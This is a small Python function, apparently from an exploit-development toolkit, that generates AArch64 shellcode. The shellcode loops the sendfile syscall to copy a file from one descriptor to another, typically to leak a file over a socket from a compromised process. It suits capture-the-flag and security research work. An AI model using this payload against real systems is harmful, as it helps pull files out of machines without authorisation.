def generate(in_fd, out_fd):
    """sends a file to user

    Args: 
        in_fd  (str/int): in file descriptor
        out_fd (str/int): out file descriptor
    """

    sc = ''
    sc += """
    sub x20, x20, x20
loop_1:
    """
    sc += """
    mov x1, %s
    mov x0, %s
    sub x2, x2, x2
    mov x3, 255
    mov x8, 71
    svc 1
    """ % (in_fd, out_fd)

    sc += """
    cmp x0, x20
    bgt loop_1
    """

    return sc
